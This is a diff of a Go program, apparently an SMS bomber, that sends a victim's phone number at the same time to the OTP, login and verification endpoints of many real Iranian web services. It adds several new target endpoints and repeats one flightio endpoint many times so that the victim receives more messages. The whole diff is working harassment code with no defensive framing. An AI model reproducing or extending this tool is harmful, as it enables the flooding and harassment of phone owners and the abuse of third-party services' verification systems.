@@ -126,34 +126,62 @@ func main() {
 		go sms("https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // add site
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
+		go sms("https://api.torob.com/v4/user/phone/send-pin/?phone_number=09122221212&source=next_desktop", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)   // add site
+		go sms("https://api.torobpay.com/user/v1/login/", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)   // add site
+		go sms("https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
+			"PhoneNo": phone,
+		}, ch)  // add site
+ 		go sms("https://app.ezpay.ir:8443/open/v1/user/validation-code", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)  // add site
+		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)   // add site
+		go sms("https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
+			"phone": phone,
+		}, ch)   // add site
+		go sms("https://www.filimo.com/api/fa/v1/user/Authenticate/signup_step1", map[string]interface{}{
+			"account": phone,
+		}, ch)   // add site
+		go sms("https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
+			"username": phone,
+		}, ch)   // add site
+		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+			"identifier": phone,
+		}, ch)   // add site
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch)
- 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch)
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
-		}, ch) 
+		}, ch)
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
-		}, ch) 
+		}, ch)
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
-		}, ch) 
+		}, ch)
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch)
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch)
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch)
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch)
 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
+
 
 
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
